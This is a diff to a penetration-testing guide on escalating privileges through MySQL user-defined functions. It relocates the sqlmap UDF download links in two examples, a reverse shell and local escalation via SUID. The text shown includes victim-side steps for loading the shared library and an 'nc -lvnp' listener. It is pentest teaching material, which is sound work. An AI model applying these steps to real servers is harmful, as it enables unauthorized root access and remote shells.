@@ -949,11 +949,12 @@ For penetration testing, we can include a UDF inside our database that loads a l
 
 Example 1 - Reverse Shell 
 
+Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64
+Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32
+
 Victim
 ```
 ps aux | grep root                        //  Verify that MySQL is running as root
-Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64
-Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32
 Save the UDF in the /tmp folder ( Example: /tmp/lib_mysqludf_sys.so)
 mysql -u root -p
 
@@ -976,11 +977,13 @@ nc -lvnp 9999
 
 Example 2 (Local via SUID)
 
-Victim
-```
-ps aux | grep root                        //  Verify that MySQL is running as root
 Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64
 Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32
+
+Victim
+
+```
+ps aux | grep root                        //  Verify that MySQL is running as root
 Save the UDF in the /tmp folder ( Example: /tmp/lib_mysqludf_sys.so)
 mysql -u root -p
 
